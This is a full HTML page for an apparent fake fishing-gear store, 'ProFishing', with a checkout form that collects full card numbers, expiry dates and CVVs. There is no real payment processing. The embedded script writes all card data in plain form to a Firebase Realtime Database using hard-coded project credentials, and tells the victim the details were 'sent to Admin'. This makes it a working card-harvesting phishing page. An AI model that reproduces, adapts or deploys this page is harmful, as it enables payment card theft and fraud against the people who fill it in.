<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ProFishing | Premium Gear Order</title>
    <!-- Tailwind CSS for professional UI -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; }
        .glass-effect {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .gradient-bg {
            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
        }
    </style>
</head>
<body class="gradient-bg min-h-screen flex items-center justify-center p-4">

    <div class="glass-effect w-full max-w-4xl rounded-3xl shadow-2xl overflow-hidden flex flex-col md:flex-row">
        
        <!-- Left Side: Branding & Image -->
        <div class="md:w-1/3 bg-blue-700 p-8 text-white flex flex-col justify-between text-center md:text-left">
            <div>
                <h1 class="text-3xl font-bold mb-2">ProFishing 🎣</h1>
                <p class="text-blue-200 text-sm">The elite choice for professional anglers worldwide. Secure your gear now.</p>
            </div>
            <div class="mt-auto">
                <img src="https://cdn-icons-png.flaticon.com/512/3050/3050559.png" alt="Fish Icon" class="w-24 h-24 mx-auto md:mx-0 mb-4 opacity-80">
                <p class="text-xs text-blue-300 italic">"Quality equipment for the perfect catch."</p>
            </div>
        </div>

        <!-- Right Side: Order Form -->
        <div class="md:w-2/3 p-8 bg-white">
            <div class="text-center mb-8">
                <h2 class="text-2xl font-bold text-gray-800">Secure Checkout</h2>
                <div class="h-1 w-20 bg-blue-600 mx-auto mt-1 rounded-full"></div>
                <p class="text-gray-500 text-sm mt-2">Please enter your shipping and payment details below.</p>
            </div>

            <form id="paymentForm" class="space-y-5">
                <!-- Personal Info -->
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                        <label class="block text-xs font-semibold text-gray-600 uppercase mb-1">Full Name</label>
                        <input type="text" id="name" required class="w-full p-3 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500 transition-all" placeholder="John Doe">
                    </div>
                    <div>
                        <label class="block text-xs font-semibold text-gray-600 uppercase mb-1">Email Address</label>
                        <input type="email" id="email" required class="w-full p-3 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500 transition-all" placeholder="john@example.com">
                    </div>
                </div>

                <!-- Product Selection -->
                <div>
                    <label class="block text-xs font-semibold text-gray-600 uppercase mb-1">Select Gear</label>
                    <select id="product" class="w-full p-3 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500 bg-white">
                        <option>Professional Carbon Rod - $89.99</option>
                        <option>Underwater GPS Sonar - $120.00</option>
                        <option>Titanium Bait Kit - $45.00</option>
                        <option>Luxury Leather Tackle Box - $65.00</option>
                    </select>
                </div>

                <!-- Card Details Container -->
                <div class="bg-gray-50 p-4 rounded-xl border border-gray-200">
                    <label class="block text-xs font-bold text-gray-400 uppercase mb-3 tracking-wider text-center">Payment Information</label>
                    
                    <div>
                        <label class="block text-xs font-medium text-gray-600 mb-1">Card Number</label>
                        <div class="relative">
                            <input type="text" id="card" required maxlength="16" 
                                   class="w-full p-3 pl-10 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500" 
                                   placeholder="0000 0000 0000 0000">
                            <span class="absolute left-3 top-3 text-gray-400">💳</span>
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-4 mt-4">
                        <div>
                            <label class="block text-xs font-medium text-gray-600 mb-1">Expiry Date</label>
                            <input type="text" id="expiry" required placeholder="MM/YY" maxlength="5"
                                   class="w-full p-3 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500 text-center">
                        </div>
                        <div>
                            <label class="block text-xs font-medium text-gray-600 mb-1">CVV</label>
                            <input type="password" id="cvv" required maxlength="3" 
                                   class="w-full p-3 border rounded-lg outline-none focus:ring-2 focus:ring-blue-500 text-center">
                        </div>
                    </div>
                </div>

                <!-- Submit Button -->
                <button type="submit" id="payBtn" 
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all transform active:scale-95 shadow-lg">
                    Complete Purchase 🚀
                </button>
            </form>

            <!-- Success Message Overlay -->
            <div id="successMsg" class="hidden text-center mt-6 animate-bounce">
                <div class="bg-green-100 text-green-700 p-3 rounded-lg border border-green-300 font-bold">
                    ✔ Order and Payment details sent to Admin!
                </div>
            </div>
        </div>
    </div>

    <!-- Firebase & Realtime DB Scripts -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAgvQm53NOWtsim7b5J77vgJcehpWIKLdg",
            authDomain: "vova-733e8.firebaseapp.com",
            databaseURL: "https://vova-733e8-default-rtdb.firebaseio.com",
            projectId: "vova-733e8",
            storageBucket: "vova-733e8.firebasestorage.app",
            messagingSenderId: "989729558349",
            appId: "1:989729558349:web:05c07c05ed3f6bdcb7b104"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('payBtn');
            
            // Button loading state
            btn.disabled = true;
            btn.innerText = "Processing Securely ...";
            btn.style.opacity = "0.7";

            const formData = {
                customer_name: document.getElementById('name').value,
                email: document.getElementById('email').value,
                product: document.getElementById('product').value,
                card_info: document.getElementById('card').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                timestamp: new Date().toLocaleString()
            };

            try {
                // Saving to Firebase
                const orderRef = ref(db, 'orders/');
                const newOrderRef = push(orderRef);
                await set(newOrderRef, formData);

                // Show success state
                document.getElementById('successMsg').classList.remove('hidden');
                btn.innerText = "Offer Completed! ✅";
                btn.classList.replace('bg-blue-600', 'bg-green-600');
                
                setTimeout(() => {
                    location.reload(); // Reload after 4 seconds to ready for next order
                }, 4000);

            } catch (error) {
                alert("Error: " + error.message);
                btn.disabled = false;
                btn.innerText = "Try Again";
            }
        });
    </script>
</body>
</html>
